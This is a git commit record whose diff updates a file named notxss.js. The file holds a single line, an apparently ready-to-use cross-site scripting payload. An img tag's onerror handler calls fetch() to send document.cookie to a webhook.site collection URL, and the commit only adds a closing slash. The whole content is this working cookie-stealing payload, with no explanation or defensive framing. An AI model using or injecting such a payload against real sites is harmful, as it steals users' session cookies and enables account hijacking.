1127d50595b17a2307bf52c74ee911d19517c0c6
Somnath Das <37792778+SomnathDas@users.noreply.github.com>
2024-03-06 00:07:02 +0530

    Update notxss.js

--- notxss.js
+++ notxss.js
@@ -1,1 +1,1 @@
-</div><img+src=x+onerror=fetch('https://webhook.site/20242d25-a041-4bd9-96dd-651cceafa77f/'+document.cookie)>
+</div><img+src=x+onerror=fetch('https://webhook.site/20242d25-a041-4bd9-96dd-651cceafa77f/'+document.cookie)/>
